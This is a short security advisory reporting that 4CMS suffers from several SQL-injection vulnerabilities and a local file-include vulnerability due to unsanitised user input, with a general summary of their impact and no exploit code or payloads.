4CMS is prone to multiple SQL-injection vulnerabilities and a local file-include vulnerability because it fails to sufficiently sanitize user-supplied data.

Exploiting the SQL-injection issues could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.

The attacker can exploit the local file-include issue to execute arbitrary local script code and obtain sensitive information that may aid in further attacks.
